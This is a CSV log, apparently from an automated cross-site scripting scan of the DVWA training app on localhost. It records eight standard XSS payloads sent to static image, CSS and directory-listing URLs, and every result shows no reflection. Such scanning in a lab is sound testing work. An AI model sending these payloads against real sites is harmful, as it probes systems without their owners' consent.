page_url,param_tested,method,payload,status,reflected,dom_rendered,stored_candidate_pages,evidence,baseline_len,response_len
http://127.0.0.1/dvwa/images/lock.png,id,GET,<script>alert('XSS')</script>,200,False,False,,,731,731
http://127.0.0.1/dvwa/images/lock.png,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,731,731
http://127.0.0.1/dvwa/images/lock.png,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,731,731
http://127.0.0.1/dvwa/images/lock.png,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,731,731
http://127.0.0.1/dvwa/images/lock.png,id,GET,<body onload=alert('XSS')>,200,False,False,,,731,731
http://127.0.0.1/dvwa/images/lock.png,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,731,731
http://127.0.0.1/dvwa/images/lock.png,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,731,731
http://127.0.0.1/dvwa/images/lock.png,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,731,731
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,<script>alert('XSS')</script>,200,False,False,,,8641,8641
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,8641,8641
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,8641,8641
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,8641,8641
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,<body onload=alert('XSS')>,200,False,False,,,8641,8641
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,8641,8641
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,8641,8641
http://127.0.0.1/dvwa/images/login_logo.png,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,8641,8641
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,<script>alert('XSS')</script>,200,False,False,,,4281,4281
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,4281,4281
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,4281,4281
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,4281,4281
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,<body onload=alert('XSS')>,200,False,False,,,4281,4281
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,4281,4281
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,4281,4281
http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,4281,4281
http://127.0.0.1/dvwa/images/logo.png,id,GET,<script>alert('XSS')</script>,200,False,False,,,4811,4811
http://127.0.0.1/dvwa/images/logo.png,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,4811,4811
http://127.0.0.1/dvwa/images/logo.png,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,4811,4811
http://127.0.0.1/dvwa/images/logo.png,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,4811,4811
http://127.0.0.1/dvwa/images/logo.png,id,GET,<body onload=alert('XSS')>,200,False,False,,,4811,4811
http://127.0.0.1/dvwa/images/logo.png,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,4811,4811
http://127.0.0.1/dvwa/images/logo.png,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,4811,4811
http://127.0.0.1/dvwa/images/logo.png,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,4811,4811
http://127.0.0.1/dvwa/images/spanner.png,id,GET,<script>alert('XSS')</script>,200,False,False,,,446,446
http://127.0.0.1/dvwa/images/spanner.png,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,446,446
http://127.0.0.1/dvwa/images/spanner.png,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,446,446
http://127.0.0.1/dvwa/images/spanner.png,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,446,446
http://127.0.0.1/dvwa/images/spanner.png,id,GET,<body onload=alert('XSS')>,200,False,False,,,446,446
http://127.0.0.1/dvwa/images/spanner.png,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,446,446
http://127.0.0.1/dvwa/images/spanner.png,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,446,446
http://127.0.0.1/dvwa/images/spanner.png,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,446,446
http://127.0.0.1/dvwa/images/warning.png,id,GET,<script>alert('XSS')</script>,200,False,False,,,401,401
http://127.0.0.1/dvwa/images/warning.png,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,401,401
http://127.0.0.1/dvwa/images/warning.png,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,401,401
http://127.0.0.1/dvwa/images/warning.png,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,401,401
http://127.0.0.1/dvwa/images/warning.png,id,GET,<body onload=alert('XSS')>,200,False,False,,,401,401
http://127.0.0.1/dvwa/images/warning.png,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,401,401
http://127.0.0.1/dvwa/images/warning.png,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,401,401
http://127.0.0.1/dvwa/images/warning.png,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,401,401
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/dollar.png,id,GET,<script>alert('XSS')</script>,200,False,False,,,287,287
http://127.0.0.1/dvwa/images/dollar.png,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,287,287
http://127.0.0.1/dvwa/images/dollar.png,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,287,287
http://127.0.0.1/dvwa/images/dollar.png,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,287,287
http://127.0.0.1/dvwa/images/dollar.png,id,GET,<body onload=alert('XSS')>,200,False,False,,,287,287
http://127.0.0.1/dvwa/images/dollar.png,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,287,287
http://127.0.0.1/dvwa/images/dollar.png,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,287,287
http://127.0.0.1/dvwa/images/dollar.png,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,287,287
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,<script>alert('XSS')</script>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,<body onload=alert('XSS')>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/login.css,id,GET,<script>alert('XSS')</script>,200,False,False,,,842,842
http://127.0.0.1/dvwa/css/login.css,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,842,842
http://127.0.0.1/dvwa/css/login.css,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,842,842
http://127.0.0.1/dvwa/css/login.css,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,842,842
http://127.0.0.1/dvwa/css/login.css,id,GET,<body onload=alert('XSS')>,200,False,False,,,842,842
http://127.0.0.1/dvwa/css/login.css,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,842,842
http://127.0.0.1/dvwa/css/login.css,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,842,842
http://127.0.0.1/dvwa/css/login.css,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,842,842
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/main.css,id,GET,<script>alert('XSS')</script>,200,False,False,,,4026,4026
http://127.0.0.1/dvwa/css/main.css,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,4026,4026
http://127.0.0.1/dvwa/css/main.css,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,4026,4026
http://127.0.0.1/dvwa/css/main.css,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,4026,4026
http://127.0.0.1/dvwa/css/main.css,id,GET,<body onload=alert('XSS')>,200,False,False,,,4026,4026
http://127.0.0.1/dvwa/css/main.css,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,4026,4026
http://127.0.0.1/dvwa/css/main.css,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,4026,4026
http://127.0.0.1/dvwa/css/main.css,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,4026,4026
http://127.0.0.1/dvwa/css/source.css,id,GET,<script>alert('XSS')</script>,200,False,False,,,240,240
http://127.0.0.1/dvwa/css/source.css,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,240,240
http://127.0.0.1/dvwa/css/source.css,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,240,240
http://127.0.0.1/dvwa/css/source.css,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,240,240
http://127.0.0.1/dvwa/css/source.css,id,GET,<body onload=alert('XSS')>,200,False,False,,,240,240
http://127.0.0.1/dvwa/css/source.css,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,240,240
http://127.0.0.1/dvwa/css/source.css,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,240,240
http://127.0.0.1/dvwa/css/source.css,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,240,240
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,<script>alert('XSS')</script>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,<body onload=alert('XSS')>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/help.css,id,GET,<script>alert('XSS')</script>,200,False,False,,,304,304
http://127.0.0.1/dvwa/css/help.css,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,304,304
http://127.0.0.1/dvwa/css/help.css,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,304,304
http://127.0.0.1/dvwa/css/help.css,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,304,304
http://127.0.0.1/dvwa/css/help.css,id,GET,<body onload=alert('XSS')>,200,False,False,,,304,304
http://127.0.0.1/dvwa/css/help.css,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,304,304
http://127.0.0.1/dvwa/css/help.css,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,304,304
http://127.0.0.1/dvwa/css/help.css,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,304,304
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,<script>alert('XSS')</script>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,<body onload=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=M;O=D,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,<script>alert('XSS')</script>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,<body onload=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=D;O=D,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1500,1500
